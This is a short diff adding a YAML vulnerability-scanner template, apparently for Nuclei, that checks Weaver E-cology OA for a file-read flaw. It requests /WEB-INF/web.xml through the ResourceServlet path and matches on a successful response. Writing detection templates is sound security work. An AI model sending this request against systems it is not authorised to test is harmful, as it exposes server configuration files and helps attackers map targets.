@@ -1,0 +1,22 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-158983
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa Readfile Ct 158983
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-158983'
+  tags: lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - <url-pattern>/weaver/
